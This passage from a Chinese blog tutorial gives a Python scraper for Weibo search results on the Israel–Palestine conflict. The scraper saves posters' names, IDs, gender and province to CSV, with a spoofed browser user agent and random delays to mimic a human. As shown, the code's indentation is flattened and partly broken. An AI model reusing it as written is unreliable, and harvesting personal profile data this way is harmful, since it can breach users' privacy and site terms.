class="string">&#x27;reposts_count&#x27;</span>),  <span class="comment"># 转发数</span></span><br><span class="line">    &#125;</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;total count: <span class="subst">&#123;count&#125;</span>&#x27;</span>)  <span class="comment"># 打印总计数</span></span><br><span class="line">    <span class="keyword">yield</span> data  <span class="comment"># 返回数据</span></span><br></pre></td></tr></table></figure><h3 id="将爬取到的内容保存到-csv-文件内"><a href="#将爬取到的内容保存到-csv-文件内" class="headerlink" title="将爬取到的内容保存到 csv 文件内"></a>将爬取到的内容保存到 csv 文件内</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    keyword = <span class="string">&#x27;巴以冲突&#x27;</span>  <span class="comment"># 设置关键词</span></span><br><span class="line">    result_file = <span class="string">f&#x27;10月26日<span class="subst">&#123;keyword&#125;</span>话题.csv&#x27;</span>  <span class="comment"># 设置结果文件名</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(result_file):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(result_file, mode=<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    writer.writerow([<span class="string">&#x27;微博ID&#x27;</span>, <span class="string">&#x27;微博发布者名称&#x27;</span>, <span class="string">&#x27;微博发布者ID&#x27;</span>, <span class="string">&#x27;微博发布者性别&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;微博发布时间&#x27;</span>, <span class="string">&#x27;微博发布来源&#x27;</span>, <span class="string">&#x27;微博内容&#x27;</span>, <span class="string">&#x27;微博发布者所在省份&#x27;</span>, <span class="string">&#x27;微博点赞数量&#x27;</span>, <span class="string">&#x27;微博评论数量&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;微博转发量&#x27;</span>])  <span class="comment"># 写入CSV文件的标题行</span></span><br><span class="line"></span><br><span class="line">    temp_data = []  <span class="comment"># 用于临时存储数据的列表</span></span><br><span class="line"></span><br><span class="line">    empty_times = <span class="number">0</span>  <span class="comment"># 空数据的连续次数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50000</span>):  <span class="comment"># 循环抓取多页数据</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;page: <span class="subst">&#123;page&#125;</span>&#x27;</span>)</span><br><span class="line">    json_data = get_single_page(page, keyword)  <span class="comment"># 获取单页数据</span></span><br><span class="line">    <span class="keyword">if</span> json_data == <span class="literal">None</span>:  <span class="comment"># 如果数据为空</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;json is none&#x27;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(json_data.get(<span class="string">&#x27;data&#x27;</span>).get(<span class="string">&#x27;cards&#x27;</span>)) &lt;= <span class="number">0</span>:  <span class="comment"># 检查是否有数据</span></span><br><span class="line">    empty_times += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    empty_times = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> empty_times &gt; <span class="number">3</span>:  <span class="comment"># 如果连续空数据超过3次</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n\n consist empty over 3 times \n\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> parse_page(json_data):  <span class="comment"># 解析并处理页面数据</span></span><br><span class="line">    temp_data.append(result)  <span class="comment"># 将数据添加到临时列表</span></span><br><span class="line">    <span class="keyword">if</span> page % save_per_n_page == <span class="number">0</span>:  <span class="comment"># 每隔一定页数保存一次数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(result_file, mode=<span class="string">&#x27;a+&#x27;</span>, encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> temp_data:</span><br><span class="line">    <span class="comment"># 将爬取到的数据写入CSV文件</span></span><br><span class="line">    writer.writerow(</span><br><span class="line">    [d[<span class="string">&#x27;wid&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;user_name&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;user_id&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;gender&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;publish_time&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;source&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;text&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;status_province&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;like_count&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;comment_count&#x27;</span>],</span><br><span class="line">    d[<span class="string">&#x27;forward_count&#x27;</span>]])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\n\n------cur turn write <span class="subst">&#123;<span class="built_in">len</span>(temp_data)&#125;</span> rows to csv------\n\n&#x27;</span>)  <span class="comment"># 打印保存数据的信息</span></span><br><span class="line">    temp_data = []  <span class="comment"># 清空临时数据列表</span></span><br><span class="line">    time.sleep(random.randint(<span class="number">4</span>, <span class="number">8</span>))  <span class="comment"># 随机等待一段时间，模拟人的操作</span></span><br></pre></td></tr></table></figure><hr><h2 id="对数据进行处理"><a href="#对数据进行处理" class="headerlink" title="对数据进行处理"></a>对数据进行处理</h2><p>打开 csv 文件后会发现，存在重复的微博内容。<br>因为微博都有自己独有的 ID，故从 ID 下手对重复值进行删除处理。<br>在 Jupyter notebook 里面进行数据处理分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="comment"># 读取CSV文件</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;10月26日巴以冲突话题.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测并删除重复值</span></span><br><span class="line">df.drop_duplicates(subset=<span class="string">&#x27;微博ID&#x27;</span>, keep=<span class="string">&#x27;first&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存处理后的结果到新的CSV文件</span></span><br><span class="line">df.to_csv(<span class="string">&#x27;处理后的内容.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="完整的代码"><a href="#完整的代码" class="headerlink" title="完整的代码"></a>完整的代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这段Python代码是一个用于爬取新浪微博数据的脚本。它使用了多个Python库来实现不同功能，包括发送HTTP请求、解析HTML和XML、处理日期和时间等。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">以下是代码的主要功能和结构：</span></span><br><span class="line"><span class="string">1. 导入所需的Python库：</span></span><br><span class="line"><span class="string">   - `requests`: 用于发送HTTP请求。</span></span><br><span class="line"><span class="string">   - `urllib.parse`: 用于构建URL参数。</span></span><br><span class="line"><span class="string">   - `time`: 用于添加时间延迟。</span></span><br><span class="line"><span class="string">   - `random`: 用于生成随机数。</span></span><br><span class="line"><span class="string">   - `pyquery`: 用于解析HTML和XML。</span></span><br><span class="line"><span class="string">   - `datetime`: 用于处理日期和时间。</span></span><br><span class="line"><span class="string">   - `os`：用于文件操作。</span></span><br><span class="line"><span class="string">   - `csv`：用于读写CSV文件。</span></span><br><span class="line"><span class="string">2. 设置一些常量和请求头信息，包括主机地址、基础URL、用户代理信息、请求头等。</span></span><br><span class="line"><span class="string">3. 定义了一个`time_formater`函数，用于将微博的时间格式转换为标准的日期时间格式。</span></span><br><span class="line"><span class="string">4. 定义了一个`get_single_page`函数，用于按页数抓取数据，构建API请求URL，并发送HTTP GET请求。它还包含了错误重试逻辑。</span></span><br><span class="line"><span class="string">5. 定义了一个`getLongText`函数，用于根据长文本的ID获取长文本内容。这部分代码涉及长文本的展开。</span></span><br><span class="line"><span class="string">6. 定义了一个`parse_page`函数，用于解析页面返回的JSON数据，提取所需的信息，并生成数据字典。</span></span><br><span class="line"><span class="string">7. 主程序部分包括以下功能：</span></span><br><span class="line"><span class="string">   - 设置关键词（`keyword`）和结果文件名（`result_file`）。</span></span><br><span class="line"><span class="string">   - 打开结果文件（CSV），如果文件不存在，则创建文件并写入标题行。</span></span><br><span class="line"><span class="string">   - 定义临时数据列表`temp_data`，用于存储数据。</span></span><br><span class="line"><span class="string">   - 进行循环，抓取多页数据，解析并处理页面数据，然后将数据写入CSV文件。</span></span><br><span class="line"><span class="string">   - 在每隔一定页数保存一次数据到CSV文件。</span></span><br><span class="line"><span class="string">   - 随机等待一段时间以模拟人的操作。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">总体来说，这段代码的主要目的是爬取新浪微博中与特定关键词相关的微博数据，并将其保存到CSV文件中。</span></span><br><span class="line"><span class="string">它处理了长文本的展开以及一些错误重试逻辑。需要注意的是，爬取网站数据时应遵守网站的使用政策和法律法规。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入requests库，用于发送HTTP请求</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode  <span class="comment"># 导入urlencode函数，用于构建URL参数</span></span><br><span class="line"><span class="keyword">import</span> time  <span class="comment"># 导入time模块，用于添加时间延迟</span></span><br><span class="line"><span class="keyword">import</span> random  <span class="comment"># 导入random模块，用于生成随机数</span></span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq  <span class="comment"># 导入PyQuery库，用于解析HTML和XML</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime  <span class="comment"># 导入datetime模块，用于处理日期和时间</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置代理等（新浪微博的数据是用ajax异步下拉加载的，network-&gt;xhr）</span></span><br><span class="line">host = <span class="string">&#x27;m.weibo.cn&#x27;</span>  <span class="comment"># 设置主机地址</span></span><br><span class="line">base_url = <span class="string">&#x27;https://%s/api/container/getIndex?&#x27;</span> % host  <span class="comment"># 基础URL，用于构建API请求URL</span></span><br><span class="line">user_agent = <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36&#x27;</span>  <span class="comment"># 设置用户代理信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,  <span class="comment"># 设置请求头中的Host字段</span></span><br><span class="line">    <span class="string">&#x27;keep&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,  <span class="comment"># 设置请求头中的keep字段</span></span><br><span class="line">    <span class="comment"># 话题巴以冲突下的URL对应的Referer</span></span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://m.weibo.cn/search?containerid=100103type%3D1%26q%3D%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81&#x27;</span>,  <span class="comment">#</span></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: user_agent  <span class="comment"># 设置请求头中的User-Agent字段</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">save_per_n_page = <span class="number">1</span>  <span class="comment"># 每隔多少页保存一次数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于将微博的时间格式转换为标准的日期时间格式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_formater</span>(<span class="params">input_time_str</span>):</span><br><span class="line">    input_format = <span class="string">&#x27;%a %b %d %H:%M:%S %z %Y&#x27;</span>  <span class="comment"># 输入时间的格式</span></span><br><span class="line">    output_format = <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>  <span class="comment"># 输出时间的格式</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> datetime.strptime(input_time_str, input_format).strftime(output_format)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按页数抓取数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_single_page</span>(<span class="params">page, keyword</span>):</span><br><span class="line">    <span class="comment"># https://m.weibo.cn/api/container/getIndex?containerid=100103type=1&amp;q=巴以冲突&amp;page_type=searchall&amp;page=1</span></span><br><span class="line">    <span class="comment"># 构建请求参数</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;containerid&#x27;</span>: <span class="string">f&#x27;100103type=1&amp;q=#<span class="subst">&#123;keyword&#125;</span>#&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;page_type&#x27;</span>: <span class="string">&#x27;searchall&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;page&#x27;</span>: page</span><br><span class="line">    &#125;</span><br><span class="line">    url = base_url + urlencode(params)  <span class="comment"># 将输入的中文关键词编码，构建出完整的API请求URL</span></span><br><span class="line">    <span class="built_in">print</span>(url)  <span class="comment"># 打印请求的URL</span></span><br><span class="line">    error_times = <span class="number">3</span>  <span class="comment"># 设置错误尝试次数</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = requests.get(url, headers=headers)  <span class="comment"># 发送HTTP GET请求</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:  <span class="comment"># 如果响应状态码为200（成功）</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response.json().get(<span class="string">&#x27;data&#x27;</span>).get(<span class="string">&#x27;cards&#x27;</span>)) &gt; <span class="number">0</span>:  <span class="comment"># 检查是否有数据</span></span><br><span class="line">                <span class="keyword">return</span> response.json()  <span class="comment"># 返回JSON响应数据</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)  <span class="comment"># 等待3秒</span></span><br><span class="line">        error_times += <span class="number">1</span>  <span class="comment"># 错误尝试次数增加</span></span><br><span class="line">        <span class="keyword">if</span> error_times &gt; <span class="number">3</span>:  <span class="comment"># 如果连续出错次数超过3次</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 返回空值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 长文本爬取代码段</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLongText</span>(<span class="params">lid</span>):  <span class="comment"># 根据长文本的ID获取长文本内容</span></span><br><span class="line">    <span class="comment"># 长文本请求头</span></span><br><span class="line">    headers_longtext = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://m.weibo.cn/status/&#x27;</span> + lid,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: user_agent</span><br><span class="line">    &#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: lid</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&#x27;https://m.weibo.cn/statuses/extend?&#x27;</span> + urlencode(params)  <span class="comment"># 构建获取长文本内容的URL</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url, headers=headers_longtext)  <span class="comment"># 发送HTTP GET请求</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:  <span class="comment"># 如果响应状态码为200（成功）</span></span><br><span class="line">    jsondata = response.json()  <span class="comment"># 解析JSON响应数据</span></span><br><span class="line">    tmp = jsondata.get(<span class="string">&#x27;data&#x27;</span>)  <span class="comment"># 获取长文本数据</span></span><br><span class="line">    <span class="keyword">return</span> pq(tmp.get(<span class="string">&quot;longTextContent&quot;</span>)).text()  <span class="comment"># 解析长文本内容</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析页面返回的JSON数据</span></span><br><span class="line">    count = <span class="number">0</span>  <span class="comment"># 计数器，用于记录爬取的数据数量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改后的页面爬取解析函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_page</span>(<span class="params">json_data</span>):</span><br><span class="line">    <span class="keyword">global</span> count  <span class="comment"># 使用全局变量count</span></span><br><span class="line">    items = json_data.get(<span class="string">&#x27;data&#x27;</span>).get(<span class="string">&#x27;cards&#x27;</span>)  <span class="comment"># 获取JSON数据中的卡片列表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(items):</span><br><span class="line">    <span class="keyword">if</span> item.get(<span class="string">&#x27;card_type&#x27;</span>) == <span class="number">7</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;导语&#x27;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> item.get(<span class="string">&#x27;card_type&#x27;</span>) == <span class="number">8</span> <span class="keyword">or</span> (item.get(<span class="string">&#x27;card_type&#x27;</span>) == <span class="number">11</span> <span class="keyword">and</span> item.get(<span class="string">&#x27;card_group&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> item.get(<span class="string">&#x27;mblog&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">    item = item.get(<span class="string">&#x27;mblog&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    item = item.get(<span class="string">&#x27;card_group&#x27;</span>)[<span class="number">0</span>].get(<span class="string">&#x27;mblog&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> item:</span><br><span class="line">    <span class="keyword">if</span> item.get(<span class="string">&#x27;isLongText&#x27;</span>) <span class="keyword">is</span> <span class="literal">False</span>:  <span class="comment"># 不是长文本</span></span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;wid&#x27;</span>: item.get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博ID</span></span><br><span class="line">    <span class="string">&#x27;user_name&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;screen_name&#x27;</span>),  <span class="comment"># 微博发布者名称</span></span><br><span class="line">    <span class="string">&#x27;user_id&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博发布者ID</span></span><br><span class="line">    <span class="string">&#x27;gender&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;gender&#x27;</span>),  <span class="comment"># 微博发布者性别</span></span><br><span class="line">    <span class="string">&#x27;publish_time&#x27;</span>: time_formater(item.get(<span class="string">&#x27;created_at&#x27;</span>)),  <span class="comment"># 微博发布时间</span></span><br><span class="line">    <span class="string">&#x27;source&#x27;</span>: item.get(<span class="string">&#x27;source&#x27;</span>),  <span class="comment"># 微博发布来源</span></span><br><span class="line">    <span class="string">&#x27;status_province&#x27;</span>: item.get(<span class="string">&#x27;status_province&#x27;</span>),  <span class="comment"># 微博发布者所在省份</span></span><br><span class="line">    <span class="string">&#x27;text&#x27;</span>: pq(item.get(<span class="string">&quot;text&quot;</span>)).text(),  <span class="comment"># 仅提取内容中的文本</span></span><br><span class="line">    <span class="string">&#x27;like_count&#x27;</span>: item.get(<span class="string">&#x27;attitudes_count&#x27;</span>),  <span class="comment"># 点赞数</span></span><br><span class="line">    <span class="string">&#x27;comment_count&#x27;</span>: item.get(<span class="string">&#x27;comments_count&#x27;</span>),  <span class="comment"># 评论数</span></span><br><span class="line">    <span class="string">&#x27;forward_count&#x27;</span>: item.get(<span class="string">&#x27;reposts_count&#x27;</span>),  <span class="comment"># 转发数</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># 长文本涉及文本的展开</span></span><br><span class="line">    tmp = getLongText(item.get(<span class="string">&#x27;id&#x27;</span>))  <span class="comment"># 调用函数获取长文本内容</span></span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;wid&#x27;</span>: item.get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博ID</span></span><br><span class="line">    <span class="string">&#x27;user_name&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;screen_name&#x27;</span>),  <span class="comment"># 微博发布者名称</span></span><br><span class="line">    <span class="string">&#x27;user_id&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博发布者ID</span></span><br><span class="line">    <span class="string">&#x27;gender&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;gender&#x27;</span>),  <span class="comment"># 微博发布者性别</span></span><br><span class="line">    <span class="string">&#x27;publish_time&#x27;</span>: time_formater(item.get(<span class="string">&#x27;created_at&#x27;</span>)),  <span class="comment"># 微博发布时间</span></span><br><span class="line">    <span class="string">&#x27;source&#x27;</span>: item.get(<span class="string">&#x27;source&#x27;</span>),  <span class="comment"># 微博发布来源</span></span><br><span class="line">    <span class="string">&#x27;text&#x27;</span>: tmp,  <span class="comment"># 仅提取内容中的文本</span></span><br><span class="line">    <span class="string">&#x27;status_province&#x27;</span>: item.get(<span class="string">&#x27;status_province&#x27;</span>),  <span class="comment"># 微博发布者所在省份</span></span><br><span class="line">    <span class="string">&#x27;like_count&#x27;</span>: item.get(<span class="string">&#x27;attitudes_count&#x27;</span>),  <span class="comment"># 点赞数</span></span><br><span class="line">    <span class="string">&#x27;comment_count&#x27;</span>: item.get(<span class="string">&#x27;comments_count&#x27;</span>),  <span class="comment"># 评论数</span></span><br><span class="line">    <span class="string">&#x27;forward_count&#x27;</span>: item.get(<span class="string">&#x27;reposts_count&#x27;</span>),  <span class="comment"># 转发数</span></span><br><span class="line">    &#125;</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;total count: <span class="subst">&#123;count&#125;</span>&#x27;</span>)  <span class="comment"># 打印总计数</span></span><br><span class="line">    <span class="keyword">yield</span> data  <span class="comment"># 返回数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    keyword = <span class="string">&#x27;巴以冲突&#x27;</span>  <span class="comment"># 设置关键词</span></span><br><span class="line">    result_file = <span class="string">f&#x27;10月26日<span class="subst">&#123;keyword&#125;</span>话题.csv&#x27;</span>  <span class="comment"># 设置结果文件名</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(result_file):</span><br><span class="line">    <span 